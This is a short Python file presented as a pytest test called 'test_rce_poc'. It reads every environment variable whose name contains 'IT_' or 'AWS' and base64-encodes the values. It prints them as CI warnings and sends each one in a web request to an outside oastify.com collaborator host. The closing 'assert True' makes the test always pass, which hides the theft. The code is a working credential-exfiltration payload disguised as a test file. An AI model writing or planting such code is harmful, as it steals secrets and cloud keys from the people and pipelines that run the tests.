
import os
import urllib.request
import base64

def test_rce_poc():
   # 1. Collect secrets
   for key, value in os.environ.items():
       if "IT_" in key or "AWS" in key:
           # Base64 encode the value
           encoded_value = base64.b64encode(value.encode('utf-8')).decode('utf-8')
           
           # Print for UI visibility
           print(f"::warning title=POC Secret Dump::{key} = {encoded_value}")

           # 2. Out-of-band network ping with the ACTUAL encoded value
           # We use an f-string to inject the 'encoded_value' variable into the URL
           url = f"http://3pt62lfmf2hytsi8ocsnvc6wlnref43t.oastify.com?key={key}&id={encoded_value}" 
           
           try:
               # We use a context manager to ensure the connection closes properly
               with urllib.request.urlopen(url, timeout=3) as response:
                   pass
           except Exception:
               pass
               
   assert True
